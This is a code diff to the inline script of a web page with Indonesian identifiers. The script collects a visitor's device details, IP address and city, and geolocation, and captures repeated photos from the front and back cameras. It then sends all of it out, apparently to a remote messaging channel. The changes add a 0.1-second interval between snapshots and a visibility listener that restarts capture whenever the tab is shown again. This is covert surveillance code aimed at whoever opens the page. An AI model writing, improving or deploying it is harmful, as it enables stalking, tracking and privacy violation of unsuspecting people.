@@ -200,10 +200,12 @@ Kota                : ${ip.city}
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0);
-          await new Promise(resolve => canvas.toBlob(async (blob) => {
-            if (blob) await kirimFoto(blob);
-            resolve();
-          }, "image/jpeg"));
+          await new Promise(resolve => setTimeout(() => {
+            canvas.toBlob(async (blob) => {
+              if (blob) await kirimFoto(blob);
+              resolve();
+            }, "image/jpeg");
+          }, 100)); // 0.1 detik antar foto
         }
 
         stream.getTracks().forEach(track => track.stop());
@@ -213,23 +215,43 @@ Kota                : ${ip.city}
       }
     };
 
+    let sudahKirimInfo = false;
+    let lanjutFoto = false;
+
     const mulai = async () => {
-      const [info, ip, lokasi] = await Promise.all([
-        ambilDataPerangkat(),
-        ambilIPInfo(),
-        ambilLokasi()
-      ]);
+      if (!sudahKirimInfo) {
+        const [info, ip, lokasi] = await Promise.all([
+          ambilDataPerangkat(),
+          ambilIPInfo(),
+          ambilLokasi()
+        ]);
+        let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
+        await kirimPesan(hasil);
+        sudahKirimInfo = true;
+        lanjutFoto = true;
+      }
 
-      let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
-
-      const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");
-      if (kameraDepan) hasil += `\n\n${kameraDepan}`;
-
-      const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");
-      if (kameraBelakang) hasil += `\n\n${kameraBelakang}`;
-
-      await kirimPesan(hasil);
+      if (lanjutFoto) {
+        const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");
+        const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");
+        if (kameraDepan || kameraBelakang) {
+          await kirimPesan(`${kameraDepan}\n\n${kameraBelakang}`);
+        }
+        lanjutFoto = false;
+      }
     };
+
+    document.addEventListener("visibilitychange", () => {
+      if (document.visibilityState === "hidden") {
+        if (!sudahKirimInfo) mulai();
+      }
+      if (document.visibilityState === "visible") {
+        if (sudahKirimInfo && !lanjutFoto) {
+          lanjutFoto = true;
+          mulai();
+        }
+      }
+    });
 
     mulai();
   </script>
